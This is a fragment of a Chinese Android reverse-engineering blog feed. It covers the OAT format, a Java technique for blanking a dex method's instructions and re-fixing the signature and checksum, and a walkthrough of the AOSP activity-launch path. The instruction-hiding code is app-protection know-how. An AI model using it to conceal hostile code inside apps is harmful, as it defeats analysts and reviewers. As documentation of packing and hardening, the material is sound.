n</td><td>OatMethodOffset[n]</td></tr></tbody></table><p>OatMethodOffset:</p><table><thead><tr><th>size</th><th>name</th></tr></thead><tbody><tr><td>int32</td><td>code_offest</td></tr><tr><td>int</td><td>gc_map_offset</td></tr></tbody></table><p>根据需要的method所在类的编号（在dex中class_def_item数组的索引值），找到对应oat_class，再根据method的编号（class_def_item中方法对应的encode<em>method数组的索引值），找到对应的OatMethodOffset，由begin</em>+code_offset(begin为内存中oatdata起始地址)，得到method的本地指令地址。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;android虚拟机（一）&quot;&gt;&lt;a href=&quot;#android虚拟机（一）&quot; class=&quot;headerlink&quot; title=&quot;android虚拟机（一）&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>dex中方法指令隐藏</title>
    <link href="http://fancy-blogs.com/2018/03/23/extractdexins/"/>
    <id>http://fancy-blogs.com/2018/03/23/extractdexins/</id>
    <published>2018-03-22T16:42:32.714Z</published>
    <updated>2019-02-25T05:08:50.413Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="dex中方法指令隐藏"><a href="#dex中方法指令隐藏" class="headerlink" title="dex中方法指令隐藏"></a>dex中方法指令隐藏</h1><p>&emsp;&emsp;通过了解dex文件格式，获取到指定方法的指令码的偏移，将指令码清空，达到对指定方法实现的隐藏效果。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>&emsp;&emsp;dex文件格式这里就不详讲了，可以通过010editor直观得看到dex文件中各个区域信息。<br>&emsp;&emsp;关键是我们怎么获取到对应方法的指令码。</p><p><img src="/2018/03/23/extractdexins/AB135E84-4557-4F37-BE37-250B72DA71A4.png" alt="AB135E84-4557-4F37-BE37-250B72DA71A4"></p><p>&emsp;&emsp;我们看到，首先获取到class_defs_item，找到类信息的偏移（class_data_off），得到class_data_item，里面有direct方法列表和virtual方法列表，每一项记录了对应方法的code_item的偏移，由该偏移我们就能找到存放指令码的区域。</p><p>&emsp;&emsp;即然要实现指定方法的查找，就需要解析dex，解析出所有方法并存放起来，再由我们指定取出，来将其指令置空。</p><p><a href="http://www.wjdiankong.cn/archives/1118" target="_blank" rel="noopener">解析dex文件代码</a></p><p>&emsp;&emsp;通过<a href="http://www.wjdiankong.cn/archives/1118" target="_blank" rel="noopener">这篇文章</a>中的提示，修改了部分代码，完成了对指定方法的置空。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>&emsp;&emsp;在解析dex代码中，我们将string、type、proto都先存放起来，以便对方法名、参数类型解析时获取。<br>&emsp;&emsp;按照之前讲的索引过程，就需要先解析class_def_item，得到class_data_item</p><p><code>public static void parseClassIds(byte[] srcByte)</code><br>&ensp;|<br>\/<br><code>private static ClassDefItem parseClassDefItem(byte[] srcByte)</code><br>&ensp;|<br>\/<br><code>public static void parseClassData(byte[] srcByte)</code></p><p>&emsp;&emsp;我编译得到的dex部分class_def_item的class_data_off为0，这里我加了个对0的判断。<br>&emsp;&emsp;得到class_data_item后就可以获取对应类的方法列表。</p><p><code>private static ClassDataItem parseClassDataItem(byte[] srcByte, int offset)</code></p><p>&emsp;&emsp;这个函数在解析class_data_item时，4个字段的类型应该是uleb128，源代码中直接byte转int，故修改了size计算函数。<br>&emsp;&emsp;class_data_item中有direct方法列表和virtual方法列表，在遍历方法时需要分开遍历。</p><p><code>public static void parseCode(byte[] srcByte)</code><br>&ensp;|<br>\/<br><code>private static CodeItem parseCodeItem(byte[] srcByte, int offset)</code></p><p>&emsp;&emsp;在解析code_item时，关键是获取到指令码数组和指令码的文件偏移。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">short[] insnsAry = new short[item.insns_size];</span><br><span class="line">int aryOffset = offset + 16;</span><br><span class="line">item.insnsoffset=aryOffset;</span><br><span class="line">for(int i=0;i&lt;item.insns_size;i++)&#123;</span><br><span class="line">byte[] insnsByte = Utils.copyByte(srcByte, aryOffset+i*2, 2);</span><br><span class="line">insnsAry[i] = Utils.byte2Short(insnsByte);</span><br><span class="line">&#125;</span><br><span class="line">item.insns = insnsAry;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;遍历方法函数，利用<code>directMethodCodeItemMap</code>和<code>virtualMethodCodeItemMap</code>将所有的方法存放起来，一个方法名对应一个方法实例。<br>&emsp;&emsp;部分method_item的code_off为0，也需要忽略处理。</p><p><code>private static String getMethodSignStr(MethodIdsItem methodItem)</code>由方法中各个字段，获取到方法的类名、方法名、参数名、返回类型，组成一个字符串。数据来源就是之前得到的string、type、proto三个列表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">codeItemMap.putAll(ParseDexUtils.directMethodCodeItemMap);</span><br><span class="line">codeItemMap.putAll(ParseDexUtils.virtualMethodCodeItemMap);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (String key : codeItemMap.keySet()) &#123;</span><br><span class="line">System.out.println(<span class="string">"key:"</span>+key);</span><br><span class="line"><span class="keyword">if</span>(key.equals(className+methodName))&#123;</span><br><span class="line">CodeItem codeitem=codeItemMap.get(key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> insns_size=codeitem.insns_size;</span><br><span class="line"><span class="keyword">int</span> insnsoffset = codeitem.insnsoffset;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"ins_size:"</span>+insns_size+<span class="string">"ins_offset:"</span>+insnsoffset);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] nopBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[insns_size*<span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;nopBytes.length;i++) &#123;</span><br><span class="line">nopBytes[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">srcByte=Utils.replaceBytes(srcByte, nopBytes, insnsoffset);</span><br><span class="line"><span class="keyword">byte</span>[] signvalue=Utils.signature(srcByte,<span class="number">32</span>);</span><br><span class="line">srcByte=Utils.replaceBytes(srcByte, signvalue, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] checksum=Utils.checksum_bin(srcByte, <span class="number">12</span>);</span><br><span class="line">srcByte=Utils.replaceBytes(srcByte, checksum, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">Utils.saveFile(<span class="string">"dex/classes_tmp.dex"</span>, srcByte);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;将所有方法合并成一个map，遍历搜索指定方法签名。获取到对应的code_item，取出指令码偏移，指令码个数，挨个置空。之后修复dex的signature和checksum。完成后替换原apk中的dex即可。<br>&emsp;&emsp;之后讲解指令码还原部分。</p><p><a href="https://github.com/Minxin/ExtractDexIns" target="_blank" rel="noopener">完成版代码</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;dex中方法指令隐藏&quot;&gt;&lt;a href=&quot;#dex中方法指令隐藏&quot; class=&quot;headerlink&quot; title=&quot;dex中方法指令隐藏&quot;&gt;&lt;/a&gt;dex中方法
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>dex保护总结</title>
    <link href="http://fancy-blogs.com/2018/03/09/dexprotect/"/>
    <id>http://fancy-blogs.com/2018/03/09/dexprotect/</id>
    <published>2018-03-09T15:47:05.886Z</published>
    <updated>2019-02-25T05:09:28.596Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="dex保护总结"><a href="#dex保护总结" class="headerlink" title="dex保护总结"></a>dex保护总结</h1><h2 id="android程序启动过程"><a href="#android程序启动过程" class="headerlink" title="android程序启动过程"></a>android程序启动过程</h2><p><a href="http://blog.csdn.net/qianhaifeng2012/article/details/52039053" target="_blank" rel="noopener">http://blog.csdn.net/qianhaifeng2012/article/details/52039053</a><br>1.Launcher.startActivitySafely</p><p>点击图标，Launcher的onClick方法相应，然后根据传入参数View v的v.getTag()方法得到被点击应用图标的ShortcutInfo，然后得到Intent数据。通过final Intent intent = ((ShortcutInfo) tag).intent。语句得到数据。有了一个应用的Intent就可以启动一个应用了。</p><p>Launcher.startActivitySafely-&gt; startActivity</p><p>2.Activity.startActivity</p><p>Activity是Launcher父类</p><p>Activity.startActivity-&gt;Activity.startActivityForResult</p><p>3.Activity.startActivityForResult</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Instrumentation.ActivityResult ar =  </span><br><span class="line">        mInstrumentation.execStartActivity(  </span><br><span class="line">            this, mMainThread.getApplicationThread(), mToken, this,  </span><br><span class="line">            intent, requestCode, options);  </span><br><span class="line">```            </span><br><span class="line"></span><br><span class="line">这里的mInstrumentation是Activity类的成员变量，它的类型是Intrumentation，定义在Instrumentation.java文件中，它用来监控应用程序和系统的交互。</span><br><span class="line">这里的mMainThread也是Activity类的成员变量，它的类型是ActivityThread，它代表的是应用程序的主线程。这里通过mMainThread.getApplicationThread获得它里面的ApplicationThread成员变量，它是一个Binder对象，ActivityManagerService会使用它来和ActivityThread来进行进程间通信。</span><br><span class="line">**这里的mMainThread代表的是Launcher应用程序运行的进程。**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Instrumentation.execStartActivity</span><br><span class="line">-&gt;(**ActivityManagerService**)ActivityManagerNative.getDefault() </span><br><span class="line">-&gt;ActivityManagerProxy.startActivity</span><br><span class="line"></span><br><span class="line">ActivityManagerProxy是一个代理类，通过IPC的Binder联系到ActivityManagerService，最后会调用ActivityManagerService的startActivity方法。</span><br><span class="line"></span><br><span class="line">4.ActivityManagerService.startActivity</span><br><span class="line"></span><br><span class="line">startActivity-&gt;startActivityAsUser-&gt;mStackSupervisor.startActivityMayWait</span><br><span class="line"></span><br><span class="line">(ActivityStackSupervisor)mStackSupervisor</span><br><span class="line"></span><br><span class="line">5.ActivityStackSupervisor.startActivityMayWait</span><br><span class="line"></span><br><span class="line">涉及两个函数：</span><br></pre></td></tr></table></figure><p>ActivityInfo aInfo =<br>               resolveActivity(intent, resolvedType, startFlags, profilerInfo, userId);  </p><pre><code>...</code></pre><p>int res = startActivityLocked(caller, intent, resolvedType, aInfo,<br>       voiceSession, voiceInteractor, resultTo, resultWho,<br>       requestCode, callingPid, callingUid, callingPackage,<br>       realCallingPid, realCallingUid, startFlags, options, ignoreTargetSecurity,<br>       componentSpecified, null, container, inTask);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中的resolveActivity方法主要是获得对参数intent的内容进行解析，得到MainActivity的相关信息，保存在aInfo变量中.</span><br><span class="line"></span><br><span class="line">6.ActivityStackSupervisor.startActivityLocked</span><br></pre></td></tr></table></figure></p><p>final int startActivityLocked(IApplicationThread caller,<br>            Intent intent, String resolvedType, ActivityInfo aInfo,<br>            IVoiceInteractionSession voiceSession, IVoiceInteractor voiceInteractor,<br>            IBinder resultTo, String resultWho, int requestCode,<br>            int callingPid, int callingUid, String callingPackage,<br>            int realCallingPid, int realCallingUid, int startFlags, Bundle options,<br>            boolean ignoreTargetSecurity, boolean componentSpecified, ActivityRecord[] outActivity,<br>            ActivityContainer container, TaskRecord inTask)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">从传进来的参数caller得到调用者的进程信息，并保存在callerApp变量中，这里就是Launcher应用程序的进程信息了。 前面说过，参数resultTo是Launcher这个Activity里面的一个Binder对象，通过它可以获得Launcher这个Activity的相关信息，保存在sourceRecord变量中。</span><br><span class="line"></span><br><span class="line">记录启动的Activity的相关信息：</span><br></pre></td></tr></table></figure></p><p>ActivityRecord r = new ActivityRecord(mService, callerApp, callingUid, callingPackage,<br>                intent, resolvedType, aInfo, mService.mConfiguration, resultRecord, resultWho,<br>                requestCode, componentSpecified, voiceSession != null, this, container, options);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>err = startActivityUncheckedLocked(r, sourceRecord, voiceSession, voiceInteractor,<br>                startFlags, true, options, inTask);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">7.ActivityStackSupervisor.startActivityUncheckedLocked</span><br><span class="line"></span><br><span class="line">这个方法主要用于创建Acitivity栈，根据Activity的启动模式，由于是点击图标进来的，一开始也设置了标志位Intent.FLAG_ACTIVITY_NEW_TASK，所以会新创建一个Activity栈。如果之前已经有栈，且不是singleinstance，就不会再创建新的栈，会将待启动的Activity添加到原来的栈中。</span><br><span class="line"></span><br><span class="line">startActivityUncheckedLocked-&gt;ActivityStack.resumeTopActivitiesLocked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.ActivityStack.resumeTopActivitiesLocked</span><br><span class="line"></span><br><span class="line">resumeTopActivitiesLocked</span><br><span class="line">-&gt;resumeTopActivityInnerLocked</span><br><span class="line">-&gt;ActivityStackSupervisor.startSpecificActivityLocked</span><br><span class="line"></span><br><span class="line">9.ActivityStackSupervisor.startSpecificActivityLocked</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">void startSpecificActivityLocked(ActivityRecord r,  </span><br><span class="line">        boolean andResume, boolean checkConfig) &#123;  </span><br><span class="line">    // Is this activity&apos;s application already running?  </span><br><span class="line">    ProcessRecord app = mService.getProcessRecordLocked(r.processName,  </span><br><span class="line">            r.info.applicationInfo.uid, true);  </span><br><span class="line">  </span><br><span class="line">    r.task.stack.setLaunchTime(r);  </span><br><span class="line">  </span><br><span class="line">    if (app != null &amp;&amp; app.thread != null) &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            if ((r.info.flags&amp;ActivityInfo.FLAG_MULTIPROCESS) == 0  </span><br><span class="line">                    || !&quot;android&quot;.equals(r.info.packageName)) &#123;  </span><br><span class="line">                // Don&apos;t add this if it is a platform component that is marked  </span><br><span class="line">                // to run in multiple processes, because this is actually  </span><br><span class="line">                // part of the framework so doesn&apos;t make sense to track as a  </span><br><span class="line">                // separate apk in the process.  </span><br><span class="line">                app.addPackage(r.info.packageName, r.info.applicationInfo.versionCode,  </span><br><span class="line">                        mService.mProcessStats);  </span><br><span class="line">            &#125;  </span><br><span class="line">            realStartActivityLocked(r, app, andResume, checkConfig);  </span><br><span class="line">            return;  </span><br><span class="line">        &#125; catch (RemoteException e) &#123;  </span><br><span class="line">            Slog.w(TAG, &quot;Exception when starting activity &quot;  </span><br><span class="line">                    + r.intent.getComponent().flattenToShortString(), e);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        // If a dead object exception was thrown -- fall through to  </span><br><span class="line">        // restart the application.  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    mService.startProcessLocked(r.processName, r.info.applicationInfo, true, 0,  </span><br><span class="line">            &quot;activity&quot;, r.intent.getComponent(), false, false, true);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当第一次启动应用程序的Activity，取回来的app为null。在Activity应用程序中的AndroidManifest.xml配置文件中，我们没有指定Application标签的process属性，系统就会默认使用package的名称。每一个应用程序都有自己的uid，因此，这里uid + process的组合就可以为每一个应用程序创建一个ProcessRecord。</p><p>所以下面if (app != null &amp;&amp; app.thread != null)条件不成立，那么条件里面realStartActivityLocked 方法就不会执行，而是执行ActivityManagerService.startProcessLocked函数进行下一步操作。</p><p>10.ActivityManagerService.startProcessLocked</p><p>app=null<br> |<br> V<br> app = newProcessRecordLocked(info, processName, isolated, isolatedUid);<br> |<br> V<br> addProcessNameLocked<br> |<br> V<br> mProcessNames.put(proc.processName, proc.uid, proc);<br> 有了进程信息之后<br> ActivityManagerService.startProcessLocked<br> |<br> V<br>Process.start</p><p>调用Process.start接口来创建一个新的进程，新的进程会导入android.app.ActivityThread类，并且执行它的main函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">entryPoint = <span class="string">"android.app.ActivityThread"</span>  </span><br><span class="line">Process.ProcessStartResult startResult = Process.start(entryPoint,  </span><br><span class="line">      app.processName, uid, uid, gids, debugFlags, mountExternal,  </span><br><span class="line">      app.info.targetSdkVersion, app.info.seinfo, requiredAbi, instructionSet,  </span><br><span class="line">      app.info.dataDir, entryPointArgs);</span><br></pre></td></tr></table></figure><p>11.Process.start</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ProcessStartResult <span class="title">start</span><span class="params">(<span class="keyword">final</span> String processClass,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">final</span> String niceName,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">int</span> uid, <span class="keyword">int</span> gid, <span class="keyword">int</span>[] gids,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">int</span> debugFlags, <span class="keyword">int</span> mountExternal,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">int</span> targetSdkVersion,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              String seInfo,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              String abi,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              String instructionSet,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              String appDataDir,  </span></span></span><br><span class="line"><span class="function"><span class="params">                              String[] zygoteArgs)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> startViaZygote(processClass, niceName, uid, gid, gids,  </span><br><span class="line">                debugFlags, mountExternal, targetSdkVersion, seInfo,  </span><br><span class="line">                abi, instructionSet, appDataDir, zygoteArgs);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (ZygoteStartFailedEx ex) &#123;  </span><br><span class="line">        Log.e(LOG_TAG,  </span><br><span class="line">                <span class="string">"Starting VM process through Zygote failed"</span>);  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(  </span><br><span class="line">                <span class="string">"Starting VM process through Zygote failed"</span>, ex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startViaZygote会通过<a href="https://www.cnblogs.com/bastard/archive/2012/09/03/2668579.html" target="_blank" rel="noopener">zygote机制</a>开启一个新的进程。由于我们导入的类名是android.app.ActivityThread，开启一个ActivityThread进程，这也是为什么一个应用程序只有一个ActivityThread，然后会执行他的main方法。</p><p>12.ActivityThread.main</p><p>其中调用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ActivityThread thread = new ActivityThread();  </span><br><span class="line">thread.attach(false);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">attach</span><span class="params">(<span class="keyword">boolean</span> system)</span> </span>&#123;  </span><br><span class="line">        .........  </span><br><span class="line">        <span class="keyword">final</span> IActivityManager mgr = ActivityManagerNative.getDefault();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mgr.attachApplication(mAppThread);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException ex) &#123;  </span><br><span class="line">             </span><br><span class="line">         &#125;  </span><br><span class="line">    ..................  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后会执行mgr.attachApplication方法，mgr = ActivityManagerNative.getDefault()，通过前面分析它是ActivityManagerService的代理对象ActivityManagerProxy对象。所以最终会转向ActivityManagerService的attachApplication方法。</p><p>其中mAppThread是ApplicationThread，是一个Binder对象，用于ActivityManagerService与ActivityThread通信。</p><p>13.ActivityManagerService.attachApplication</p><p>attachApplication-&gt;attachApplicationLocked</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ProcessRecord app;  </span><br><span class="line">    if (pid != MY_PID &amp;&amp; pid &gt;= 0) &#123;  </span><br><span class="line">        synchronized (mPidsSelfLocked) &#123;  </span><br><span class="line">            app = mPidsSelfLocked.get(pid);  </span><br><span class="line">        ....</span><br><span class="line">    </span><br><span class="line">try &#123;  </span><br><span class="line">    if (mStackSupervisor.attachApplicationLocked(app)) &#123;  </span><br><span class="line">        didSomething = true;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过pid获取之前由Process.start创建的进程的信息记录,再由<code>mStackSupervisor.attachApplicationLocked(app)</code>执行</p><p>attachApplicationLocked：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try &#123;  </span><br><span class="line">      if (realStartActivityLocked(hr, app, true, true)) &#123;  </span><br><span class="line">          didSomething = true;  </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>调用mMainStack.realStartActivityLocked执行真正的Activity启动操作。这里要启动的Activity通过调用mMainStack.topRunningActivityLocked(null)从堆栈顶端取回来，这时候在堆栈顶端的Activity就是MainActivity了。</p><p>14.ActivityManagerService.realStartActivityLocked</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">final boolean realStartActivityLocked(ActivityRecord r,  </span><br><span class="line">        ProcessRecord app, boolean andResume, boolean checkConfig)  </span><br><span class="line">        throws RemoteException &#123;  </span><br><span class="line">  </span><br><span class="line">      </span><br><span class="line">        .....................  </span><br><span class="line">        app.thread.scheduleLaunchActivity(new Intent(r.intent), r.appToken,  </span><br><span class="line">                System.identityHashCode(r), r.info, new Configuration(mService.mConfiguration),  </span><br><span class="line">                new Configuration(stack.mOverrideConfig), r.compat, r.launchedFromPackage,  </span><br><span class="line">                task.voiceInteractor, app.repProcState, r.icicle, r.persistentState, results,  </span><br><span class="line">                newIntents, !andResume, mService.isNextTransitionForward(), profilerInfo);  </span><br><span class="line">  </span><br><span class="line">        ..........................  </span><br><span class="line">  </span><br><span class="line">    return true;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app.thread是ApplicationThreadProxy对象，是一个代理对象，代理就是ApplicationThread，情况完全类似于ActivityManagerProxy代理类。所以逻辑转向了ApplicationThread的scheduleLaunchActivity方法。</p><p>15.ApplicationThread.scheduleLaunchActivity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public final void scheduleLaunchActivity(Intent intent, IBinder token, int ident,  </span><br><span class="line">               ActivityInfo info, Configuration curConfig, Configuration overrideConfig,  </span><br><span class="line">               CompatibilityInfo compatInfo, String referrer, IVoiceInteractor voiceInteractor,  </span><br><span class="line">               int procState, Bundle state, PersistableBundle persistentState,  </span><br><span class="line">               List&lt;ResultInfo&gt; pendingResults, List&lt;ReferrerIntent&gt; pendingNewIntents,  </span><br><span class="line">               boolean notResumed, boolean isForward, ProfilerInfo profilerInfo) &#123;  </span><br><span class="line"> </span><br><span class="line">           updateProcessState(procState, false);  </span><br><span class="line"> </span><br><span class="line">           ActivityClientRecord r = new ActivityClientRecord();  </span><br><span class="line"> </span><br><span class="line">           r.token = token;  </span><br><span class="line">           r.ident = ident;  </span><br><span class="line">           r.intent = intent;  </span><br><span class="line">           r.referrer = referrer;  </span><br><span class="line">           r.voiceInteractor = voiceInteractor;  </span><br><span class="line">           r.activityInfo = info;  </span><br><span class="line">           r.compatInfo = compatInfo;  </span><br><span class="line">           r.state = state;  </span><br><span class="line">           r.persistentState = persistentState;  </span><br><span class="line"> </span><br><span class="line">           r.pendingResults = pendingResults;  </span><br><span class="line">           r.pendingIntents = pendingNewIntents;  </span><br><span class="line"> </span><br><span class="line">           r.startsNotResumed = notResumed;  </span><br><span class="line">           r.isForward = isForward;  </span><br><span class="line"> </span><br><span class="line">           r.profilerInfo = profilerInfo;  </span><br><span class="line"> </span><br><span class="line">           r.overrideConfig = overrideConfig;  </span><br><span class="line">           updatePendingConfiguration(curConfig);  </span><br><span class="line"> </span><br><span class="line">           sendMessage(H.LAUNCH_ACTIVITY, r);  </span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>函数首先创建一个ActivityClientRecord实例，并且初始化它的成员变量，然后发送一个启动Activity的消息交给Handler处理.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 